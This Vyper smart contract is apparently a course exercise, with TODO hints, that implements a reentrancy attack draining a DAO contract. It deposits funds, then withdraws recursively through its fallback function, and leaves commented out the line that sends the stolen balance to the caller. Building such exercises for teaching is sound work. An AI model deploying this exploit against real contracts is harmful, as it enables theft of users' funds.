interface DAO:
    def deposit() -> bool: payable
    def withdraw() -> bool: nonpayable
    def userBalances(addr: address) -> uint256: view
    def getBalance() -> uint256: view

dao_address: public(address)
owner_address: public(address)

event Log:
    sender: indexed(address)
    receiver: indexed(address)
    value: uint256
    
@external
def setDAOaddress(_dao_address: address):
    self.dao_address = _dao_address

@external
@view
def getBalanceOfDAO() -> uint256:
    return DAO(self.dao_address).getBalance()

@external
@view
def getBalanceOfAttacker() -> uint256:
    return self.balance
    
@external
@payable
def depositInDAO() -> bool:
    return DAO(self.dao_address).deposit(value=700)

@external
@payable
def withdrawFromDAO() -> bool:
    return DAO(self.dao_address).withdraw()

@external
def __init__():
    self.dao_address = ZERO_ADDRESS
    self.owner_address = ZERO_ADDRESS

@internal
def _attack() -> bool:
    assert self.dao_address != ZERO_ADDRESS
    
    # TODO: Use the DAO interface to withdraw funds.
    # Make sure you add a "base case" to end the recursion
    withdrawn: bool = False
    if self.dao_address.balance > 0:
        withdrawn = DAO(self.dao_address).withdraw()
    return withdrawn

@external
@payable
def attack(dao_address:address):
    self.dao_address = dao_address
    self.owner_address = msg.sender
    deposit_amount: uint256 = msg.value    
 
    # Attack cannot withdraw more than what exists in the DAO
    if dao_address.balance < msg.value:
        deposit_amount = dao_address.balance
    
    # TODO: make the deposit into the DAO   
    deposited: bool = DAO(self.dao_address).deposit(value=deposit_amount)
    # TODO: Start the reentrancy attack
    drained: bool = self._attack()
    # TODO: After the recursion has finished, all the stolen funds are held by this contract. Now, you need to send all funds (deposited and stolen) to the entity that called this contract
    #send(self.owner_address, self.balance)

@external
@payable
def __default__():
    # This method gets invoked when ETH is sent to this contract's address (i.e., when "withdraw" is called on the DAO contract)
    
    # TODO: Add code here to complete the recursive call
    log Log(msg.sender, self, msg.value)
    if self.dao_address.balance >= msg.value:
        withdrawn: bool = DAO(self.dao_address).withdraw()